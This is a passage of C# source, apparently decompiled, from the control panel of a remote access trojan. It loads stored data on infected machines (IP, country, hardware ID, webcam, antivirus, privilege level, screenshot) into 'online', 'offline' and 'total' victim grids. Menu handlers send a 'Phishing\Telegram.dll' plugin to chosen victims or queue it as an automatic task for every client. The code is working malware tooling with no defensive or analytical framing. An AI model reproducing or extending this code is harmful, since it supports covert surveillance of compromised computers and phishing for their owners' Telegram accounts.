	private static OfflineUserData ReadUserFromDisk(string userDir)
	{
		OfflineUserData d = new OfflineUserData
		{
			Hwid = Path.GetFileName(userDir)
		};
		string infoFile = Path.Combine(userDir, "Information.txt");
		string noteFile = Path.Combine(userDir, "Note.txt");
		string screenshotFile = Path.Combine(userDir, "screenshot.png");
		Dictionary<string, string> info = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
		if (File.Exists(infoFile))
		{
			string[] array = File.ReadAllLines(infoFile);
			foreach (string line in array)
			{
				int idx = line.IndexOf(": ");
				if (idx > 0)
				{
					info[line.Substring(0, idx).Trim()] = line.Substring(idx + 2).Trim();
				}
			}
		}
		d.Note = (File.Exists(noteFile) ? File.ReadAllText(noteFile).Trim() : "");
		if (string.IsNullOrEmpty(d.Note) && info.ContainsKey("6"))
		{
			d.Note = info["6"];
		}
		try
		{
			d.LastSeen = (File.Exists(infoFile) ? File.GetLastWriteTime(infoFile).ToString("dd.MM.yyyy HH:mm:ss") : Directory.GetLastWriteTime(userDir).ToString("dd.MM.yyyy HH:mm:ss"));
		}
		catch
		{
		}
		d.IP = (info.ContainsKey("IP") ? info["IP"] : "");
		d.Country = (info.ContainsKey("Country") ? info["Country"] : "");
		d.Group = (info.ContainsKey("Group") ? info["Group"] : "");
		d.UserPC = (info.ContainsKey("UserPC") ? info["UserPC"] : "");
		d.Camera = (info.ContainsKey("Camera") ? info["Camera"] : "");
		d.Cpu = (info.ContainsKey("Cpu") ? info["Cpu"] : "");
		d.Gpu = (info.ContainsKey("Gpu") ? info["Gpu"] : "");
		d.Os = (info.ContainsKey("Os") ? info["Os"] : "");
		d.AV = (info.ContainsKey("AntiVirus") ? info["AntiVirus"] : "");
		d.Version = (info.ContainsKey("Version") ? info["Version"] : "");
		d.TimeInstall = (info.ContainsKey("TimeInstall") ? info["TimeInstall"] : "");
		d.Privilege = (info.ContainsKey("Privilege") ? info["Privilege"] : "");
		try
		{
			if (File.Exists(screenshotFile))
			{
				using MemoryStream ms = new MemoryStream(File.ReadAllBytes(screenshotFile));
				d.Screenshot = new Bitmap(ms);
			}
		}
		catch
		{
		}
		try
		{
			d.Flag = FlagHelper.GetFlagImage("", d.Country);
		}
		catch
		{
		}
		if (d.Flag == null)
		{
			d.Flag = FlagHelper.GetUnknownFlagImageSafe();
		}
		return d;
	}

	private DataGridViewRow BuildOfflineRow(OfflineUserData d, int rowHeight)
	{
		DataGridViewRow obj = new DataGridViewRow
		{
			Height = rowHeight
		};
		DataGridViewImageCell sc = new DataGridViewImageCell
		{
			ImageLayout = DataGridViewImageCellLayout.Stretch
		};
		sc.Value = d.Screenshot ?? new Bitmap(1, 1);
		obj.Cells.Add(sc);
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.IP
		});
		obj.Cells.Add(new CenteredFlagImageCell
		{
			Value = d.Flag
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Country
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Group
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Note
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Hwid
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.UserPC
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Camera
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Cpu
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Gpu
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Os
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.AV
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Version
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.TimeInstall
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Privilege
		});
		obj.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = d.Status
		});
		return obj;
	}

	public void LoadOfflineUsersAsync()
	{
		if (!Directory.Exists("Users"))
		{
			return;
		}
		HashSet<string> onlineHwids = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
		foreach (DataGridViewRow r in (IEnumerable)GridClients.Rows)
		{
			if (r.Cells.Count > 6 && r.Cells[6].Value is string h && !string.IsNullOrEmpty(h))
			{
				onlineHwids.Add(h);
			}
		}
		int rowHeight = GridClients.RowTemplate.Height;
		GridOfflineClients.RowTemplate.Height = rowHeight;
		System.Threading.Tasks.Task.Run(delegate
		{
			string[] directories = Directory.GetDirectories("Users");
			List<DataGridViewRow> rows = new List<DataGridViewRow>(directories.Length);
			string[] array = directories;
			foreach (string text in array)
			{
				string fileName = Path.GetFileName(text);
				if (!onlineHwids.Contains(fileName))
				{
					OfflineUserData d = ReadUserFromDisk(text);
					d.Status = d.LastSeen;
					rows.Add(BuildOfflineRow(d, rowHeight));
				}
			}
			GridOfflineClients.Invoke((Action)delegate
			{
				GridOfflineClients.SuspendLayout();
				GridOfflineClients.Rows.Clear();
				if (rows.Count > 0)
				{
					GridOfflineClients.Rows.AddRange(rows.ToArray());
				}
				GridOfflineClients.ResumeLayout();
				ApplyGridScheme(GridOfflineClients, FormMaterial.PrimaryColor, MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK);
			});
		});
	}

	public void LoadTotalUsersAsync()
	{
		if (!Directory.Exists("Users"))
		{
			return;
		}
		HashSet<string> onlineHwids = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
		List<DataGridViewRow> onlineRows = new List<DataGridViewRow>();
		int rowHeight = GridClients.RowTemplate.Height;
		GridTotalClients.RowTemplate.Height = rowHeight;
		foreach (DataGridViewRow r in (IEnumerable)GridClients.Rows)
		{
			if (r.Cells.Count >= 17)
			{
				string hwid = r.Cells[6].Value?.ToString() ?? "";
				if (!string.IsNullOrEmpty(hwid))
				{
					onlineHwids.Add(hwid);
				}
				DataGridViewRow row = new DataGridViewRow
				{
					Height = rowHeight
				};
				DataGridViewImageCell sc = new DataGridViewImageCell
				{
					ImageLayout = DataGridViewImageCellLayout.Stretch
				};
				sc.Value = r.Cells[0].Value ?? new Bitmap(1, 1);
				row.Cells.Add(sc);
				row.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (r.Cells[1].Value?.ToString() ?? "")
				});
				row.Cells.Add(new CenteredFlagImageCell
				{
					Value = r.Cells[2].Value
				});
				for (int i = 3; i <= 15; i++)
				{
					row.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = (r.Cells[i].Value?.ToString() ?? "")
					});
				}
				row.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = "Online"
				});
				onlineRows.Add(row);
			}
		}
		System.Threading.Tasks.Task.Run(delegate
		{
			string[] directories = Directory.GetDirectories("Users");
			List<DataGridViewRow> offlineRows = new List<DataGridViewRow>(directories.Length);
			string[] array = directories;
			foreach (string text in array)
			{
				string fileName = Path.GetFileName(text);
				if (!onlineHwids.Contains(fileName))
				{
					OfflineUserData d = ReadUserFromDisk(text);
					d.Status = "Offline | " + d.LastSeen;
					offlineRows.Add(BuildOfflineRow(d, rowHeight));
				}
			}
			GridTotalClients.Invoke((Action)delegate
			{
				GridTotalClients.SuspendLayout();
				GridTotalClients.Rows.Clear();
				List<DataGridViewRow> list = new List<DataGridViewRow>(onlineRows.Count + offlineRows.Count);
				list.AddRange(onlineRows);
				list.AddRange(offlineRows);
				if (list.Count > 0)
				{
					GridTotalClients.Rows.AddRange(list.ToArray());
				}
				GridTotalClients.ResumeLayout();
				ApplyGridScheme(GridTotalClients, FormMaterial.PrimaryColor, MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK);
			});
		});
	}

	public void LoadOfflineUsers()
	{
		LoadOfflineUsersAsync();
	}

	public void LoadTotalUsers()
	{
		LoadTotalUsersAsync();
	}

	private void telegramToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Phishing\\Telegram.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				Methods.AppendLogs(clients.IP, "Send plugin: Plugin\\Phishing\\Telegram.dll", Color.Blue);
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void toolStripMenuItem579_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Phishing\\Telegram.dll");
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3]
		{
			"Invoke",
			checksum,
			new byte[1]
		};
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Telegram";
		AutoTaskMgr.AppendTask(task);
	}

